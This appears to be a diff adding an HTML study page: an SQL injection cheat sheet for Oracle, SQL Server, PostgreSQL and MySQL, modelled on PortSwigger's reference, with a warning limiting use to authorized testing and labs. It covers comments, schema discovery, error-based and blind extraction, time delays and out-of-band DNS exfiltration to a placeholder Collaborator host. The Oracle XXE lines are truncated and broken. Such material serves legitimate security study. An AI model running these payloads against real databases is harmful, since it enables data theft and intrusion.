@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL Injection Cheat Sheet</title>
+<style>
+  :root {
+    --bg: #f5f7fb;
+    --card: #ffffff;
+    --text: #1f2937;
+    --muted: #64748b;
+    --border: #dbe2ea;
+    --accent: #2563eb;
+    --accent-soft: #eff6ff;
+    --warning: #b45309;
+    --warning-soft: #fffbeb;
+    --code: #111827;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: Arial, Helvetica, sans-serif;
+    line-height: 1.6;
+  }
+
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 36px 20px 60px;
+  }
+
+  header {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 30px;
+    margin-bottom: 24px;
+  }
+
+  h1 {
+    margin: 0 0 10px;
+    font-size: 2.2rem;
+  }
+
+  h2 {
+    margin-top: 0;
+    font-size: 1.45rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px;
+  }
+
+  h3 {
+    margin-bottom: 8px;
+  }
+
+  p { margin: 10px 0 14px; }
+
+  .intro {
+    color: var(--muted);
+    max-width: 850px;
+  }
+
+  .note, .warning {
+    padding: 14px 17px;
+    border-radius: 8px;
+    margin: 18px 0;
+  }
+
+  .note {
+    background: var(--accent-soft);
+    border-left: 4px solid var(--accent);
+  }
+
+  .warning {
+    background: var(--warning-soft);
+    border-left: 4px solid var(--warning);
+  }
+
+  section {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    margin-bottom: 20px;
+  }
+
+  .table-wrap {
+    overflow-x: auto;
+    margin-top: 15px;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    min-width: 760px;
+  }
+
+  th, td {
+    border: 1px solid var(--border);
+    padding: 12px;
+    vertical-align: top;
+    text-align: left;
+  }
+
+  th {
+    background: #f8fafc;
+    font-weight: 700;
+  }
+
+  td:first-child, th:first-child {
+    width: 140px;
+    font-weight: 700;
+  }
+
+  code {
+    font-family: Consolas, Monaco, monospace;
+    background: #eef2f7;
+    padding: 2px 5px;
+    border-radius: 4px;
+    word-break: break-word;
+  }
+
+  pre {
+    background: var(--code);
+    color: #f8fafc;
+    padding: 15px;
+    border-radius: 8px;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-word;
+    font-family: Consolas, Monaco, monospace;
+    line-height: 1.5;
+  }
+
+  .db {
+    color: var(--accent);
+    font-weight: 700;
+  }
+
+  footer {
+    color: var(--muted);
+    text-align: center;
+    font-size: 0.9rem;
+    margin-top: 30px;
+  }
+
+  @media (max-width: 700px) {
+    h1 { font-size: 1.8rem; }
+    section, header { padding: 18px; }
+  }
+</style>
+</head>
+
+<body>
+<div class="container">
+
+<header>
+  <h1>SQL Injection Cheat Sheet</h1>
+  <p class="intro">
+    A practical reference for SQL injection syntax across Oracle, Microsoft SQL Server,
+    PostgreSQL, and MySQL. The examples below are organized by the task they help perform:
+    string manipulation, comments, database discovery, conditional behavior, time delays,
+    and out-of-band techniques.
+  </p>
+
+  <div class="warning">
+    <strong>Learning / authorized testing:</strong>
+    Use these techniques only against systems you own, explicitly have permission to test,
+    or intentionally vulnerable training environments such as PortSwigger Web Security Academy.
+  </div>
+</header>
+
+<section>
+  <h2>1. String Concatenation</h2>
+  <p>
+    String concatenation combines multiple strings into one string. The syntax differs
+    between database platforms.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Syntax</th></tr>
+      <tr><td>Oracle</td><td><code>'foo'||'bar'</code></td></tr>
+      <tr><td>Microsoft</td><td><code>'foo'+'bar'</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>'foo'||'bar'</code></td></tr>
+      <tr><td>MySQL</td><td><code>'foo' 'bar'</code> <em>(space between strings)</em><br><code>CONCAT('foo','bar')</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>2. Substring</h2>
+  <p>
+    A substring function extracts part of a string using an offset and a length.
+    The offset index is 1-based in these examples.
+  </p>
+
+  <p>Each expression below returns <code>ba</code>:</p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Syntax</th></tr>
+      <tr><td>Oracle</td><td><code>SUBSTR('foobar', 4, 2)</code></td></tr>
+      <tr><td>Microsoft</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+      <tr><td>MySQL</td><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>3. Comments</h2>
+  <p>
+    SQL comments can cause the remainder of a query to be ignored after the injected
+    input. Comment syntax differs between databases.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Syntax</th></tr>
+      <tr><td>Oracle</td><td><code>--comment</code></td></tr>
+      <tr><td>Microsoft</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>--comment</code><br><code>/*comment*/</code></td></tr>
+      <tr><td>MySQL</td><td><code>#comment</code><br><code>\-- comment</code> <em>(space after --)</em><br><code>/*comment*/</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>4. Database Version</h2>
+  <p>
+    Querying the database version can help identify the database technology and version
+    during authorized security testing.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Syntax</th></tr>
+      <tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td></tr>
+      <tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
+      <tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>5. Database Contents</h2>
+  <p>
+    Database metadata can be used to identify tables and columns. The exact metadata
+    sources depend on the database platform.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Tables</th><th>Columns</th></tr>
+      <tr>
+        <td>Oracle</td>
+        <td><code>SELECT * FROM all_tables</code></td>
+        <td><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
+      </tr>
+      <tr>
+        <td>Microsoft</td>
+        <td><code>SELECT * FROM information_schema.tables</code></td>
+        <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
+      </tr>
+      <tr>
+        <td>PostgreSQL</td>
+        <td><code>SELECT * FROM information_schema.tables</code></td>
+        <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
+      </tr>
+      <tr>
+        <td>MySQL</td>
+        <td><code>SELECT * FROM information_schema.tables</code></td>
+        <td><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
+      </tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>6. Conditional Errors</h2>
+  <p>
+    Conditional error techniques test a Boolean condition and deliberately trigger
+    a database error when that condition is true. This can be useful when investigating
+    error-based or blind SQL injection behavior.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Example</th></tr>
+      <tr>
+        <td>Oracle</td>
+        <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td>
+      </tr>
+      <tr>
+        <td>Microsoft</td>
+        <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
+      </tr>
+      <tr>
+        <td>PostgreSQL</td>
+        <td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td>
+      </tr>
+      <tr>
+        <td>MySQL</td>
+        <td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td>
+      </tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>7. Extracting Data via Visible Error Messages</h2>
+  <p>
+    Some database errors may include values produced by a query. In a vulnerable
+    application, this can potentially expose sensitive information through the
+    application's error response.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Example</th><th>Example Result</th></tr>
+      <tr>
+        <td>Microsoft</td>
+        <td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code></td>
+        <td><code>Conversion failed when converting the varchar value 'secret' to data type int.</code></td>
+      </tr>
+      <tr>
+        <td>PostgreSQL</td>
+        <td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code></td>
+        <td><code>invalid input syntax for integer: "secret"</code></td>
+      </tr>
+      <tr>
+        <td>MySQL</td>
+        <td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code></td>
+        <td><code>XPATH syntax error: '\secret'</code></td>
+      </tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>8. Batched (Stacked) Queries</h2>
+  <p>
+    Batched queries allow multiple SQL statements to execute in succession. The subsequent
+    query results are not normally returned to the application, so this technique is mainly
+    relevant to blind vulnerabilities where the second query causes a detectable side effect.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Syntax / Support</th></tr>
+      <tr><td>Oracle</td><td>Does not support batched queries.</td></tr>
+      <tr><td>Microsoft</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code><br><code>QUERY-1-HERE QUERY-2-HERE</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr>
+      <tr><td>MySQL</td><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr>
+    </table>
+  </div>
+
+  <div class="note">
+    <strong>MySQL note:</strong>
+    Batched queries typically cannot be used for SQL injection, but they may occasionally
+    be possible when the target application uses particular PHP or Python APIs to communicate
+    with MySQL.
+  </div>
+</section>
+
+<section>
+  <h2>9. Time Delays</h2>
+  <p>
+    A time-delay technique deliberately makes the database pause while processing a query.
+    An unconditional 10-second delay can be produced using the following database-specific
+    syntax.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Example</th></tr>
+      <tr><td>Oracle</td><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr>
+      <tr><td>Microsoft</td><td><code>WAITFOR DELAY '0:0:10'</code></td></tr>
+      <tr><td>PostgreSQL</td><td><code>SELECT pg_sleep(10)</code></td></tr>
+      <tr><td>MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>10. Conditional Time Delays</h2>
+  <p>
+    Instead of always delaying, a condition can determine whether the delay occurs.
+    This is useful when testing blind SQL injection through measurable response times.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Database</th><th>Example</th></tr>
+      <tr>
+        <td>Oracle</td>
+        <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td>
+      </tr>
+      <tr>
+        <td>Microsoft</td>
+        <td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td>
+      </tr>
+      <tr>
+        <td>PostgreSQL</td>
+        <td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+      </tr>
+      <tr>
+        <td>MySQL</td>
+        <td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></td>
+      </tr>
+    </table>
+  </div>
+</section>
+
+<section>
+  <h2>11. DNS Lookup</h2>
+  <p>
+    Out-of-band SQL injection can sometimes be investigated by causing the database
+    to perform a DNS lookup to an external domain. In PortSwigger labs, Burp Collaborator
+    can provide a unique domain and can be used to observe whether an interaction occurred.
+  </p>
+
+  <h3>Oracle</h3>
+  <pre>SELECT EXTRACTVALUE(xmltype(' %remote;]>'),'/l') FROM dual</pre>
+  <p>
+    The source notes that this older technique relies on an XXE-related vulnerability.
+    A technique for fully patched Oracle installations is also provided, but it requires
+    elevated privileges:
+  </p>
+  <pre>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</pre>
+
+  <h3>Microsoft</h3>
+  <pre>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</pre>
+
+  <h3>PostgreSQL</h3>
+  <pre>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</pre>
+
+  <h3>MySQL</h3>
+  <p>The following techniques work on Windows only:</p>
+  <pre>LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\a')
+SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'</pre>
+</section>
+
+<section>
+  <h2>12. DNS Lookup with Data Exfiltration</h2>
+  <p>
+    A more advanced out-of-band technique can cause the database to perform a DNS lookup
+    to a domain that contains data returned by an injected query. Burp Collaborator can
+    then be used to observe the resulting interaction and inspect the transmitted value.
+  </p>
+
+  <h3>Oracle</h3>
+  <pre>SELECT EXTRACTVALUE(xmltype(' %remote;]>'),'/l') FROM dual</pre>
+
+  <h3>Microsoft</h3>
+  <pre>declare @p varchar(1024);
+set @p=(SELECT YOUR-QUERY-HERE);
+exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</pre>
+
+  <h3>PostgreSQL</h3>
+  <pre>create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+
+SELECT f();</pre>
+
+  <h3>MySQL</h3>
+  <p>The following technique works on Windows only:</p>
+  <pre>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'</pre>
+</section>
+
+<section>
+  <h2>Quick Mental Model</h2>
+
+  <div class="note">
+    <p><strong>When studying SQL injection, think in this order:</strong></p>
+    <ol>
+      <li><strong>Identify the database:</strong> Oracle, Microsoft, PostgreSQL, or MySQL.</li>
+      <li><strong>Understand the original query:</strong> Where does the input enter?</li>
+      <li><strong>Understand syntax:</strong> concatenation, substrings, comments, and database-specific functions.</li>
+      <li><strong>Determine the response type:</strong> visible results, errors, Boolean differences, timing, or out-of-band interaction.</li>
+      <li><strong>Choose the appropriate technique:</strong> error-based, blind, time-based, UNION-based, or OAST.</li>
+      <li><strong>Verify the result:</strong> Don't assume a payload worked simply because it was accepted.</li>
+    </ol>
+  </div>
+</section>
+
+<section>
+  <h2>Key Takeaways</h2>
+  <ul>
+    <li>SQL syntax differs significantly between database platforms.</li>
+    <li>Knowing the database type helps determine which syntax is available.</li>
+    <li>Comments can change how the remainder of a vulnerable query is interpreted.</li>
+    <li>Metadata tables can reveal database structure during authorized testing.</li>
+    <li>Blind SQL injection can rely on Boolean behavior, errors, timing, or out-of-band interactions.</li>
+    <li>Time delays are useful when the application does not directly reveal query results.</li>
+    <li>DNS/OAST techniques can provide evidence of server-side execution when normal responses reveal nothing.</li>
+    <li>The exact technique depends on both the database and the application's query context.</li>
+  </ul>
+</section>
+
+<footer>
+  SQL Injection Cheat Sheet — Study reference based on the provided source material.
+</footer>
+
+</div>
+</body>
+</html>
